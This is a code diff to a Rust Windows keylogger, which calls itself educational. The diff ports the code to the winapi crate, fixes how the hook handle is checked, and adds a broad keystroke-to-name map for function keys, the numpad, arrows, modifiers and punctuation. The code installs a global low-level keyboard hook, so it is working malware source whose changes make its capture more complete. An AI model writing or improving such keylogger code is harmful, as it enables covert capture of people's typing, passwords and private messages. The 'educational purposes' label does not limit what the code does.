@@ -1,4 +1,6 @@
 use std::ptr;
+use winapi::shared::windef::HHOOK;
+use winapi::shared::minwindef::{HINSTANCE, LPARAM, LRESULT, WPARAM};
 
 /*
 This is a keylogger for educational purposes only.
@@ -99,7 +101,7 @@ fn main() {
     ctrlc::set_handler(move || { // esta linea es para capturar ctrl+c
         println!("\nReceived Ctrl+C, cleaning up...");
         unsafe {
-            if HOOK != 0 { // si el hook está activo
+            if !HOOK.is_null() { // si el hook está activo
                 UnhookWindowsHookEx(HOOK);
                 println!("Hook removed successfully");
             }
@@ -113,7 +115,7 @@ fn main() {
         eprintln!("Error starting keylogger: {}", e);
         // Cleanup en caso de error
         unsafe {
-            if HOOK != 0 {
+            if !HOOK.is_null() {
                 UnhookWindowsHookEx(HOOK);
             }
         }
@@ -124,16 +126,12 @@ fn main() {
 }
 
 
-// CAMBIAR POR winapi !!!!
-use windows_sys::Win32::{
-    Foundation::{HINSTANCE, LPARAM, LRESULT, WPARAM},
-    UI::WindowsAndMessaging::{
-        CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
-        HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
-    },
+use winapi::um::winuser::{
+    CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
+    HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
 };
 
-static mut HOOK: isize = 0;
+static mut HOOK: HHOOK = ptr::null_mut();
 
 unsafe extern "system" fn low_level_keyboard_proc(
     n_code: i32,
@@ -157,7 +155,50 @@ unsafe extern "system" fn low_level_keyboard_proc(
                 0x20 => " ".to_string(),
                 0x30..=0x39 => char::from(vk_code as u8).to_string(), // 0-9
                 0x41..=0x5A => char::from(vk_code as u8).to_string(), // A-Z
-                // Hay algunas teclas especiales que habríá que mapear acá como WIN, F1-F12, etc.
+                0x70..=0x87 => format!("[F{}]", vk_code - 0x6F), // F1-F12 y más
+                0x90 => "[NUM LOCK]".to_string(),
+                0x91 => "[SCROLL LOCK]".to_string(),
+                0x14 => "[CAPS LOCK]".to_string(),
+                0x2D => "[INSERT]".to_string(),
+                0x2E => "[DELETE]".to_string(),
+                0x24 => "[HOME]".to_string(),
+                0x23 => "[END]".to_string(),
+                0x21 => "[PAGE UP]".to_string(),
+                0x22 => "[PAGE DOWN]".to_string(),
+                0x25 => "[LEFT ARROW]".to_string(),
+                0x26 => "[UP ARROW]".to_string(),
+                0x27 => "[RIGHT ARROW]".to_string(),
+                0x28 => "[DOWN ARROW]".to_string(),
+                0x5B => "[LEFT WIN]".to_string(),
+                0x5C => "[RIGHT WIN]".to_string(),
+                0x5D => "[MENU]".to_string(),
+                // Teclado numérico
+                0x60..=0x69 => format!("[NUM {}]", vk_code - 0x60), // NUM 0-9
+                0x6A => "[NUM *]".to_string(),
+                0x6B => "[NUM +]".to_string(),
+                0x6C => "[NUM ENTER]".to_string(),
+                0x6D => "[NUM -]".to_string(),
+                0x6E => "[NUM .]".to_string(),
+                0x6F => "[NUM /]".to_string(),
+                // Símbolos y puntuación
+                0xBA => ";".to_string(),    // ;:
+                0xBB => "=".to_string(),    // =+
+                0xBC => ",".to_string(),    // ,<
+                0xBD => "-".to_string(),    // -_
+                0xBE => ".".to_string(),    // .>
+                0xBF => "/".to_string(),    // /?
+                0xC0 => "`".to_string(),    // `~
+                0xDB => "[".to_string(),    // [{
+                0xDC => "\\".to_string(),   // \|
+                0xDD => "]".to_string(),    // ]}
+                0xDE => "'".to_string(),    // '"
+                // Teclas de modificadores adicionales
+                0xA0 => "[LEFT SHIFT]".to_string(),
+                0xA1 => "[RIGHT SHIFT]".to_string(),
+                0xA2 => "[LEFT CTRL]".to_string(),
+                0xA3 => "[RIGHT CTRL]".to_string(),
+                0xA4 => "[LEFT ALT]".to_string(),
+                0xA5 => "[RIGHT ALT]".to_string(),
                 _ => format!("[{}]", vk_code),
             };
             
@@ -176,11 +217,11 @@ fn capture_keystroke() -> Result<(), Box<dyn std::error::Error>> {
         HOOK = SetWindowsHookExW(
             WH_KEYBOARD_LL,
             Some(low_level_keyboard_proc),
-            0 as HINSTANCE,
+            ptr::null_mut(),
             0,
         );
         
-        if HOOK == 0 {
+        if HOOK.is_null() {
             return Err("Failed to install keyboard hook".into());
         }
         
@@ -188,7 +229,7 @@ fn capture_keystroke() -> Result<(), Box<dyn std::error::Error>> {
         
         // Loop de mensajes para mantener el hook activo
         let mut msg: MSG = std::mem::zeroed(); // Inicializar MSG
-        while GetMessageW(&mut msg, 0, 0, 0) > 0 {
+        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
             // El hook procesa automáticamente las teclas
         }
         
